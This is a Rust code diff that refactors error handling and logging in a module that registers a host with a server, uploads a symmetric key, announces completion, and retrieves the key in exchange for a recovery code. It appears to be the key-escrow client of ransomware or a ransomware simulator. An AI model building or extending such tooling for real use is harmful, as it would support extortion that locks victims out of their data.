@@ -1,18 +1,23 @@
-use log::{debug, error, info};
-use purecrypto::rsa::BoxedRsaPublicKey;
 use std::{path::Path, str};
-use zeroize::Zeroizing;
 
-use crate::{config, crypto::decrypt_string, status::Status};
+use anyhow::{Context, anyhow};
 use coconut_crab_lib::{
     file::write_to_file,
     web::{
         client::{web_get_recv_bytes, web_post_send_json_recv_text},
+        responses::ServerResponse,
         routes,
         structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
-        validate::{create_proof, decode_hex},
+        types::RecoveryCode,
+        validate::{create_proof, decode_hex, validate_code},
     },
 };
+use hex::decode;
+use purecrypto::{rsa::BoxedRsaPublicKey, zeroize::Zeroizing};
+use serde::Serialize;
+use tracing::{debug, info};
+
+use crate::{config, crypto::decrypt_string, status::Status};
 
 #[derive(Clone, Debug)]
 pub struct ServerConn {
@@ -47,54 +52,40 @@ impl ServerConn {
     }
 }
 
-fn post_json<T: serde::Serialize>(
+fn post_json<T: Serialize>(
     url: &str,
     payload: &T,
     verify_server: bool,
     label: &str,
-) -> Result<(), String> {
-    let Some(content) = web_post_send_json_recv_text(url, payload, verify_server) else {
-        return Err(format!("No response from server for {label}"));
-    };
-    debug!("Response content text: {content}");
-    if content != "Success" {
-        return Err(format!("Unexpected {label} response: {content}"));
+) -> anyhow::Result<()> {
+    let content = web_post_send_json_recv_text(url, payload, verify_server)
+        .with_context(|| format!("{label} request failed"))?;
+    debug!(content, "Response content text");
+    match ServerResponse::parse(&content) {
+        Some(ServerResponse::Success) => Ok(()),
+        None => Err(anyhow!("unexpected {label} response: {content}")),
     }
-    Ok(())
 }
 
 pub fn write_asym_pub_key_to_disk(
     asym_pub_key: &BoxedRsaPublicKey,
     file_path: &Path,
-) -> Result<(), String> {
+) -> anyhow::Result<()> {
     let pem_data = asym_pub_key.to_spki_pem();
-    match write_to_file(pem_data.as_bytes(), file_path) {
-        Ok(()) => {
-            info!(
-                "Successfully wrote PEM data to file: {}",
-                file_path.display()
-            );
-            Ok(())
-        }
-        Err(error) => {
-            error!("Failed to write PEM data to file: {error}");
-            Err(format!("Failed to write public key: {error}"))
-        }
-    }
+    write_to_file(pem_data.as_bytes(), file_path)?;
+    info!(path = %file_path.display(), "Successfully wrote PEM data to file");
+    Ok(())
 }
 
-pub fn download_asym_pub_key(conn: &ServerConn) -> Result<BoxedRsaPublicKey, String> {
+pub fn download_asym_pub_key(conn: &ServerConn) -> anyhow::Result<BoxedRsaPublicKey> {
     let url = conn.base_url(routes::ASYM_PUB_KEY_PATH.as_str());
-    debug!("Asymmetric public key download URL: {url}");
-    let content = web_get_recv_bytes(&url, conn.verify_server)
-        .ok_or_else(|| "No response downloading public key".to_string())?;
-    let pem = str::from_utf8(&content)
-        .map_err(|error| format!("Server response is not valid UTF-8: {error}"))?;
-    BoxedRsaPublicKey::from_spki_pem(pem)
-        .map_err(|error| format!("Failed to parse PEM public key: {error}"))
+    debug!(url, "Asymmetric public key download URL");
+    let content = web_get_recv_bytes(&url, conn.verify_server)?;
+    let pem = str::from_utf8(&content).context("server response is not valid UTF-8")?;
+    BoxedRsaPublicKey::from_spki_pem(pem).context("failed to parse PEM public key")
 }
 
-pub fn register(conn: &ServerConn, status: &Status, secret: &str) -> Result<(), String> {
+pub fn register(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Result<()> {
     let url = conn.base_url(routes::REGISTER.as_str());
     let proof_source = [status.id.as_bytes(), status.hostname.as_bytes()].concat();
     let registration = Registration {
@@ -105,7 +96,7 @@ pub fn register(conn: &ServerConn, status: &Status, secret: &str) -> Result<(), 
     post_json(&url, &registration, conn.verify_server, "registration")
 }
 
-pub fn upload_sym_key(conn: &ServerConn, status: &Status, secret: &str) -> Result<(), String> {
+pub fn upload_sym_key(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Result<()> {
     let url = conn.base_url(routes::UPLOAD_SYM_KEY.as_str());
     let proof_source = [
         status.id.as_bytes(),
@@ -122,12 +113,12 @@ pub fn upload_sym_key(conn: &ServerConn, status: &Status, secret: &str) -> Resul
     Ok(())
 }
 
-pub fn announce_completion(conn: &ServerConn, status: &Status, secret: &str) -> Result<(), String> {
+pub fn announce_completion(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Result<()> {
     let url = conn.base_url(routes::ANNOUNCE_COMPLETION.as_str());
-    let proof_source = status.id.as_bytes();
+    let proof_source = status.id.as_bytes().to_vec();
     let announce_completion = AnnounceCompletion {
         id: status.id.clone(),
-        proof: create_proof(proof_source, secret),
+        proof: create_proof(&proof_source, secret),
     };
     post_json(&url, &announce_completion, conn.verify_server, "completion")?;
     info!("Successfully announced completion");
@@ -139,38 +130,40 @@ fn download_sym_key(
     status: &Status,
     code: &str,
     secret: &str,
-) -> Result<Zeroizing<[u8; 32]>, String> {
+) -> anyhow::Result<Zeroizing<[u8; 32]>> {
+    if !validate_code(code) {
+        return Err(anyhow!("invalid recovery code"));
+    }
     let url = conn.base_url(routes::DOWNLOAD_SYM_KEY.as_str());
     let proof_source = [status.id.as_bytes(), code.as_bytes()].concat();
     let download_sym_key = DownloadSymKey {
         id: status.id.clone(),
-        code: code.to_string(),
+        code: RecoveryCode::new(code.to_string()),
         proof: create_proof(&proof_source, secret),
     };
-    let Some(content) = web_post_send_json_recv_text(&url, &download_sym_key, conn.verify_server)
-    else {
-        return Err("Server did not respond to symmetric key request".to_string());
-    };
+    let content = web_post_send_json_recv_text(&url, &download_sym_key, conn.verify_server)
+        .context("symmetric key request failed")?;
     let content = Zeroizing::new(content);
     let Some(sym_key) = decode_hex::<32>(&content) else {
-        return Err("Server response is not a symmetric key".to_string());
+        return Err(anyhow!("server response is not a symmetric key"));
     };
     Ok(Zeroizing::new(sym_key))
 }
 
-pub fn get_sym_key(
+#[tracing::instrument(skip_all)]
+pub fn fetch_sym_key(
     conn: &ServerConn,
     status: &Status,
     code: &str,
     preshared_secret: &str,
-) -> Result<Zeroizing<[u8; 32]>, String> {
+) -> anyhow::Result<Zeroizing<[u8; 32]>> {
     let key = download_sym_key(conn, status, code, preshared_secret)?;
-    let id_ciphertext = hex::decode(&status.symmetrically_encrypted_id)
-        .map_err(|error| format!("Unable to decode hex encrypted id: {error}"))?;
+    let id_ciphertext =
+        decode(&status.symmetrically_encrypted_id).context("unable to decode hex encrypted id")?;
     let id_nonce: [u8; 12] = decode_hex(&status.symmetrically_encrypted_id_nonce)
-        .ok_or_else(|| "Unable to decode hex nonce".to_string())?;
-    let id_tag: [u8; 16] = decode_hex(&status.symmetrically_encrypted_id_tag)
-        .ok_or_else(|| "Unable to decode hex tag".to_string())?;
+        .context("unable to decode hex nonce")?;
+    let id_tag: [u8; 16] =
+        decode_hex(&status.symmetrically_encrypted_id_tag).context("unable to decode hex tag")?;
     let decrypt_id_attempt = decrypt_string(
         &id_ciphertext,
         &key,
@@ -182,6 +175,6 @@ pub fn get_sym_key(
         info!("Received correct symmetric key from server");
         Ok(key)
     } else {
-        Err("Received incorrect symmetric key from server".to_string())
+        Err(anyhow!("received incorrect symmetric key from server"))
     }
 }
